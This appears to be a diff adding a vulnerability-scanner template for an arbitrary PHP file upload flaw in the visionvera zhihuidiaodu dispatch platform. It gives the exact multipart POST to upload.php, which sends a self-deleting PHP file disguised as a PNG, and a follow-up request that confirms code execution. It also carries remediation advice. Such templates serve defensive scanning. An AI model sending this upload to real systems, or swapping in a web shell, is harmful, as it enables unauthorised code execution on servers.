@@ -1,0 +1,44 @@
+id: visionvera-zhihuidiaodu-upload-php-file-upload
+
+info:
+  name: visionvera zhihuidiaodu upload.php文件上传漏洞
+  author: bl
+  severity: critical
+  tags: 指挥调度管理平台
+  description: |-
+    该模板用于识别 visionvera zhihuidiaodu upload.php 组件中的任意文件上传漏洞。攻击者可利用受影响端点上传恶意文件，在服务器配置允许的情况下，可能导致远程代码执行或存储型内容污染。实际影响受目标版本、部署配置及端点暴露程度等因素制约。
+  remediation: >-
+    升级到已修复版本，仅允许业务必需的文件类型，校验文件实际内容而不能只检查扩展名；将上传文件存放在 Web 根目录之外并使用随机生成的文件名，禁止上传目录执行脚本，同时限制文件大小和访问权限。
+  
+variables:
+  match_1: '{{md5(r1)}}'
+  r0: '{{to_lower(rand_base(8))}}'
+  r1: '{{to_lower(rand_base(8))}}'
+
+flow: http(1) && http(2)
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/custom/zx/upload.php'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu
+    body: "------WebKitFormBoundarySwvD8hSn3Z0sHfMu\r\nContent-Disposition: form-data; name=\"ulfile\";filename=\"{{r0}}.php\"\r\nContent-Type: image/png\r\n\r\n<?php echo md5(\"{{r1}}\"); unlink(__FILE__); ?>\r\n------WebKitFormBoundarySwvD8hSn3Z0sHfMu--\r\n"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/upload/{{r0}}.php'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{match_1}}"
+        part: body
